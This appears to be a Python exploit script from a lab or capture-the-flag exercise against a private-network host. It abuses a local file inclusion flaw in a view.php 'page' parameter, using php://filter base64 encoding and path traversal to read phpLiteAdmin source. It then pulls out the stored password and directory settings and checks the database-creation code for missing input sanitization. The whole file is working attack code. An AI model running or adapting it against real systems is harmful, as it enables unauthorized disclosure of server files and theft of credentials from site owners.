#!/usr/bin/env python3
"""Read phpLiteAdmin PHP source via php://filter base64"""
import requests
import re
import base64

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# Try php://filter to get raw source
payload = 'php://filter/convert.base64-encode/resource=../../../var/www/dbadmin/test_db.php'
r = s.get(f'{BASE}/view.php?page={payload}', timeout=10)
print(f'php://filter attempt: {r.status_code} ({len(r.text)}B)')

if len(r.text) > 20:
    clean = re.sub(r'<[^>]+>', '', r.text).strip()
    print(f'Clean text length: {len(clean)}')
    # Try to decode
    try:
        decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
        print(f'Decoded: {len(decoded)} bytes')
        
        # Find the critical parts
        # 1. Directory variable
        dir_match = re.search(r'\$directory\s*=\s*["\']([^"\']+)["\']', decoded)
        if dir_match:
            print(f'\n[+] $directory = "{dir_match.group(1)}"')
        
        # 2. Password variable
        pwd_match = re.search(r'\$password\s*=\s*["\']([^"\']+)["\']', decoded)
        if pwd_match:
            print(f'[+] $password = "{pwd_match.group(1)}"')
        
        # 3. New database creation logic
        newdb_idx = decoded.find('proc_newdb')
        if newdb_idx >= 0:
            print(f'\n[+] proc_newdb section:')
            print(decoded[max(0,newdb_idx-100):newdb_idx+500])
        
        # 4. Any sanitization of dbname
        sanitize_patterns = ['preg_replace', 'str_replace', 'basename', 'realpath', 'htmlspecialchars', 'addslashes']
        for sp in sanitize_patterns:
            idx = decoded.find(sp)
            if idx >= 0:
                print(f'\n[+] {sp} found at {idx}:')
                print(decoded[max(0,idx-50):idx+200])
        
        # Save full source
        with open('phpliteadmin_decoded.php', 'w', encoding='utf-8') as f:
            f.write(decoded)
        print(f'\nFull source saved to phpliteadmin_decoded.php ({len(decoded)} bytes)')
        
    except Exception as e:
        print(f'Decode error: {e}')
        print(f'Raw: {clean[:200]}')
else:
    print('Empty response. Trying alternative paths...')
    alt_paths = [
        'php://filter/convert.base64-encode/resource=../../../var/www/dbadmin/phpliteadmin.php',
        'php://filter/convert.base64-encode/resource=../../var/www/dbadmin/test_db.php',
    ]
    for p in alt_paths:
        r = s.get(f'{BASE}/view.php?page={p}', timeout=10)
        clean = re.sub(r'<[^>]+>', '', r.text).strip()
        if len(clean) > 20:
            try:
                decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
                print(f'  {p}: {len(decoded)}B decoded')
                dir_match = re.search(r'\$directory\s*=\s*["\']([^"\']+)["\']', decoded)
                if dir_match:
                    print(f'    $directory = {dir_match.group(1)}')
            except:
                print(f'  {p}: {len(clean)}B but decode failed')
        else:
            print(f'  {p}: {len(clean)}B (empty)')
